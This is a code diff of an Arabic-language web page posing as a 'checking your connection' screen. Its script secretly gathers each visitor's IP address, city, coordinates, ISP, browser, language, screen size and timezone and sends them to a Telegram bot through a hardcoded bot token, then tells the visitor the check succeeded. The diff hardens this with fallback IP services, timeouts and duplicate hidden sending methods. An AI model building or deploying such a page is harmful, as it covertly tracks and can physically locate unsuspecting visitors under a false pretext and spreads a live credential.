@@ -19,86 +19,79 @@
 <body>
 <div class="card">
   <div class="spinner"></div>
-  <h1>جاري التحقق من الاتصال...</h1>
-  <p>يرجى الانتظار، يتم فحص شبكة الاتصال لديك.</p>
+  <h1 id="h1">جاري التحقق من الاتصال...</h1>
+  <p id="p">يرجى الانتظار، يتم فحص شبكة الاتصال لديك.</p>
 </div>
 
 <script>
-// ================== الإعدادات ==================
+// ============ الإعدادات ============
 const BOT_TOKEN = "8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho";
 const CHAT_ID   = "8278195073";
-// ==============================================
+// ===================================
 
-// 1) جلب الـ IP العام للزائر
+// 1) جلب الـ IP مع 3 مصادر احتياطية (لو فشل واحد نجرب التالي)
 async function getIP() {
-  const r = await fetch('https://api.ipify.org?format=json');
-  const d = await r.json();
-  return d.ip;
+  const apis = [
+    'https://api.ipify.org?format=json',
+    'https://api64.ipify.org?format=json',
+    'https://ipapi.co/json/'
+  ];
+  for (const url of apis) {
+    try {
+      const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
+      const d = await r.json();
+      if (d && d.ip) return d.ip;
+    } catch (e) { /* جرّب المصدر التالي */ }
+  }
+  return 'غير معروف';
 }
 
-// 2) جلب تفاصيل إضافية (دولة، مدينة، ISP، إحداثيات...)
-async function getGeo(ip) {
-  try {
-    const r = await fetch('https://ipwho.is/' + ip);
-    const d = await r.json();
-    if (!d.success) return null;
-    return {
-      country: d.country,
-      city: d.city,
-      region: d.region,
-      isp: d.connection.isp,
-      lat: d.latitude,
-      lon: d.longitude,
-      tz: d.timezone.id
-    };
-  } catch (e) { return null; }
-}
-
-// 3) الإرسال إلى تيليغرام
+// 2) الإرسال لتيليغرام بطريقتين: fetch no-cors ثم Image كاحتياط
 function sendToTelegram(text) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
               `?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-  // صورة خفية تتجاوز قيود CORS (تيليغرام يدعم GET)
-  const img = new Image();
-  img.src = url;
+  try { fetch(url, { mode: 'no-cors' }).catch(function(){}); } catch (e) {}
+  try { new Image().src = url; } catch (e) {}
 }
 
 (async function main() {
   try {
+    // الـ IP أولاً — مع مهلة زمنية حتى لا يتجمد السكربت
     const ip = await getIP();
-    const geo = await getGeo(ip);
 
-    const ua     = navigator.userAgent;
-    const lang   = navigator.language;
-    const screen = `${screen.width}x${screen.height}`;
-    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    let battery  = 'غير معروف';
-    if (navigator.getBattery) {
-      battery = await navigator.getBattery().then(b => Math.round(b.level * 100) + '%')
-                                            .catch(() => 'غير معروف');
-    }
+    // معلومات جغرافية — اختيارية ولا توقف الإرسال لو فشلت
+    let geo = null;
+    try {
+      const r = await fetch('https://ipwho.is/' + ip, { signal: AbortSignal.timeout(5000) });
+      const d = await r.json();
+      if (d && d.success) geo = d;
+    } catch (e) {}
 
-    let msg  = `🕵️ زائر جديد دخل الصفحة\n`;
-    msg     += `──────────────\n`;
-    msg     += `🌐 IP: ${ip}\n`;
+    const ua     = navigator.userAgent || '';
+    const lang   = navigator.language || 'غير معروف';
+    const screen = (window.screen ? screen.width + 'x' + screen.height : 'غير معروف');
+    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+
+    let msg  = '🕵️ زائر جديد دخل الصفحة\n──────────────\n';
+    msg     += '🌐 IP: ' + ip + '\n';
     if (geo) {
-      msg += `📍 الموقع: ${geo.city}، ${geo.country}\n`;
-      msg += `🗺️ الإحداثيات: ${geo.lat}, ${geo.lon}\n`;
-      msg += `🏢 مزوّد الخدمة: ${geo.isp}\n`;
+      msg += '📍 الموقع: ' + (geo.city || '?') + '، ' + (geo.country || '?') + '\n';
+      msg += '🗺️ الإحداثيات: ' + geo.latitude + ', ' + geo.longitude + '\n';
+      msg += '🏢 مزوّد الخدمة: ' + (geo.connection && geo.connection.isp ? geo.connection.isp : '?') + '\n';
     }
-    msg += `🖥️ المتصفح: ${ua.substring(0, 150)}\n`;
-    msg += `🌍 اللغة: ${lang}\n`;
-    msg += `📱 الشاشة: ${screen}\n`;
-    msg += `🕒 المنطقة الزمنية: ${tz}\n`;
-    msg += `🔋 البطارية: ${battery}\n`;
-    msg += `⏰ التاريخ: ${new Date().toLocaleString()}`;
+    msg += '🖥️ المتصفح: ' + ua.substring(0, 150) + '\n';
+    msg += '🌍 اللغة: ' + lang + '\n';
+    msg += '📱 الشاشة: ' + screen + '\n';
+    msg += '🕒 المنطقة الزمنية: ' + tz + '\n';
+    msg += '⏰ التاريخ: ' + new Date().toLocaleString();
 
-    sendToTelegram(msg);
-    document.querySelector('h1').textContent = 'تم التحقق بنجاح ✓';
-    document.querySelector('p').textContent = 'يمكنك المتابعة الآن.';
+    sendToTelegram(msg);   // الإرسال أولاً ثم تحديث الواجهة
+    document.getElementById('h1').textContent = 'تم التحقق بنجاح ✓';
+    document.getElementById('p').textContent = 'يمكنك المتابعة الآن.';
   } catch (e) {
-    document.querySelector('h1').textContent = 'تعذر الاتصال';
-    console.error(e);
+    // محاولة أخيرة: أرسل نص الخطأ نفسه لتعرف أن الصفحة فشلت
+    try { sendToTelegram('⚠️ فشل في الصفحة: ' + (e && e.message ? e.message : e)); } catch (err) {}
+    document.getElementById('h1').textContent = 'تعذر الاتصال';
   }
 })();
 </script>
